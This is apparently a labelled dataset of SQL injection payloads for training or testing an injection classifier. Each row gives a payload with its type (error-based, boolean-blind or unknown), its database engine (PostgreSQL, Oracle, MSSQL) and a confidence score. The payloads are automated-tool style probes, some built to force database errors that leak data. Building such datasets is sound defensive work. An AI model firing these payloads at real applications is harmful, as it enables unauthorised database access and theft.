id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
39327,"select * from users WHERE username = ""1\' ) ) ) or username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39328,"select * from users WHERE username = ""1%\' and username = ""-9564 and username = ""-6190\' ) where 2621 = 2621 and username = ""-5062 ) where 7457 = 7457",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39329,"select * from users WHERE username = ""-1985 ) ) ) and \'nmdq\' like \'nmdq"" or username = ""-7874 ) ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39330,"1"" and \'%\' = \'"" or username = ""1\' ) ) and ( ( \'qtul\' like \'qtul",unknown,generic,0.50,Insufficient data to classify payload type,1
39331,"-3978 and username = ""-3499\' ) ) ) and ( ( ( \'nzap\' like \'nzap",unknown,generic,0.50,Insufficient data to classify payload type,1
39332,"SELECT * FROM users WHERE username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 OR username = ""1\'+ ( select oljg where 2006 = 2006",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39333,"1\' where 8537 = 8537 and username = ""1 ) and ( ( ( \'%\' = \'"" and username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39334,-9505\' ) ) ) and ( ( ( \'qhdg\' = \'qhdg,unknown,generic,0.50,Insufficient data to classify payload type,1
39335,"select * from users WHERE username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'"" and username = ""-7430\' ) as xfah where 1596 = 1596 or username = ""1\' )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39336,"1\' and username = ""-3899\' ) where 8152 = 8152 and username = ""1"" and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'",error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39337,"select * from users WHERE username = ""-5863"" and ""gkvy"" = ""gkvy"" and username = ""1%"" and username = ""1\'",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39338,1 ) ) as iihk where 5414 = 5414 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,error_based,oracle,0.85,Error Based detected: character extraction (oracle),1
39339,"select * from users WHERE username = ""-9564 or username = ""1\' where 8537 = 8537 and username = ""1 )",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
39340,"select * from users WHERE username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'%\' = \'"" and username = ""-6353%\' ) )",error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
39341,"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-5062 ) where 7457 = 7457 or username = ""-8007\' ) ) as bgpp where 9555 = 9555",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
39342,"sElEct * from usErs whErE usErnamE = ""1\'|| ( sElEct \'tisi' from dual whErE 1616 = 1616",boolean_blind,oracle,0.80,Boolean Blind detected: SQL structure with complex syn (oracle),1
39343,"select * from users WHERE username = ""-3499\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""-9564 and username = ""-6190\' ) where 2621 = 2621",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
